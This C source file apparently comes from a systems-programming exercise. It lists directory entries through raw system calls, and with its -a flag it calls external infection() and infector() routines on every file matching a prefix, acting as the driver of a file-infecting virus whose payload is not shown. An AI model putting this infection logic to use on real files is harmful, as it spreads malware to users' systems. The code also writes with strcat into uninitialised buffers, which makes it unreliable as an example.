#include "util.h"
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_READ 3
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define SYS_GETENDS 141
#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define O_RDONLY 0
extern int system_call();
extern void infection();
extern void infector(char*);
extern void code_start();
extern void code_end();
#define BUF_SIZE 8192
void printPerfix(int nread,char buf[],char* perfix);
void printNotPerfix(int nread,char buf[]);
void printPerfixA(int nread,char buf[],char* perfix);
typedef struct ent{
    int inode;
    int offset;
    unsigned short len;
    char name[1];
} ent;


enum
  {
    DT_UNKNOWN = 0,
# define DT_UNKNOWN	DT_UNKNOWN
    DT_FIFO = 1,
# define DT_FIFO	DT_FIFO
    DT_CHR = 2,
# define DT_CHR		DT_CHR
    DT_DIR = 4,
# define DT_DIR		DT_DIR
    DT_BLK = 6,
# define DT_BLK		DT_BLK
    DT_REG = 8,
# define DT_REG		DT_REG
    DT_LNK = 10,
# define DT_LNK		DT_LNK
    DT_SOCK = 12,
# define DT_SOCK	DT_SOCK
    DT_WHT = 14
# define DT_WHT		DT_WHT
  };

int main(int argc, char* argv[]){
    int fd;
    long nread;
    char buf[BUF_SIZE];
    int hasP = -1;
    int hasA = -1;
    char* perfix;
    if(argc >1 && strncmp("-p",argv[1],2)==0){
        hasP = 1;
        perfix = argv[1] +2;
    }
    if(argc >1 && strncmp("-a",argv[1],2)==0){
        hasA = 1;
        perfix = argv[1] +2;
    }
    fd = system_call(SYS_OPEN,"./", O_RDONLY, (0777 | 0644));
    if(fd == -1){
        system_call(SYS_WRITE,STDOUT,"error from file read path.\n",27);
        system_call(1,0x55);
    }
    while(1) {
        nread = system_call(SYS_GETENDS,fd,buf,BUF_SIZE);
        if(nread == -1){
            char* str = "error read getends.\n";
            system_call(SYS_WRITE,STDOUT,str,strlen(str));
            system_call(1,0x55);
        }
        if(nread == 0) break;
        if(hasP == 1)
            printPerfix(nread,buf,perfix);
        else if (hasA ==1){
            char* str1 = itoa((int)&code_start);
            char startA[15+strlen(str1)];
            strcat(startA,"Start Address: ");
            strcat(startA,str1);
            char* str2 = itoa((int)&code_end);
            char endA[13+strlen(str2)];
            strcat(endA,"End Address: ");
            strcat(endA,str2);
            system_call(SYS_WRITE,STDOUT,strcat(startA,"\n"),strlen(startA)+1);
            system_call(SYS_WRITE,STDOUT,strcat(endA,"\n\n"),strlen(endA)+2);
            printPerfixA(nread,buf,perfix);
        }
        else printNotPerfix(nread,buf);
    }
    system_call(SYS_CLOSE,fd);
    return 0;
}

void printPerfix(int nread,char buf[],char* perfix){
    long bpos;
    for (bpos = 0; bpos < nread;) {
        struct ent*  d = (struct ent *) (buf + bpos);
        if(strncmp(d->name,perfix,1) == 0){
            char d_type = *(buf + bpos + d->len - 1);
            char* type = (d_type == DT_REG) ?  "regular" :
            (d_type == DT_DIR) ?  "directory" :
                            (d_type == DT_FIFO) ? "FIFO" :
                            (d_type == DT_SOCK) ? "socket" :
                            (d_type == DT_LNK) ?  "symlink" :
                            (d_type == DT_BLK) ?  "block dev" :
                            (d_type == DT_CHR) ?  "char dev" : "???";
            system_call(SYS_WRITE,STDOUT,d->name,strlen(d->name));
            system_call(SYS_WRITE,STDOUT,"\t",1);  
            system_call(SYS_WRITE,STDOUT,type,strlen(type));
            system_call(SYS_WRITE,STDOUT,"\n",1);  
        }         
        bpos += d->len;
    }
}

void printNotPerfix(int nread,char buf[]){
    long bpos;
    for (bpos = 0; bpos < nread;) {
        struct ent*  d = (struct ent *) (buf + bpos);
        system_call(SYS_WRITE,STDOUT,d->name,strlen(d->name));
        system_call(SYS_WRITE,STDOUT,"\n",1);           
        bpos += d->len;
        }
}




void printPerfixA(int nread,char buf[],char* perfix){
    long bpos;
    for (bpos = 0; bpos < nread;) {
        struct ent*  d = (struct ent *) (buf + bpos);
        if(strncmp(d->name,perfix,1) == 0){
            infection();
            infector(d->name);
            char d_type = *(buf + bpos + d->len - 1);
            char* type = (d_type == DT_REG) ?  "regular" :
                            (d_type == DT_DIR) ?  "directory" :
                            (d_type == DT_FIFO) ? "FIFO" :
                            (d_type == DT_SOCK) ? "socket" :
                            (d_type == DT_LNK) ?  "symlink" :
                            (d_type == DT_BLK) ?  "block dev" :
                            (d_type == DT_CHR) ?  "char dev" : "???";
            system_call(SYS_WRITE,STDOUT,d->name,strlen(d->name));
            system_call(SYS_WRITE,STDOUT,"\t",1);  
            system_call(SYS_WRITE,STDOUT,type,strlen(type));
            system_call(SYS_WRITE,STDOUT,"\n",1);  
        }         
        bpos += d->len;
        }
}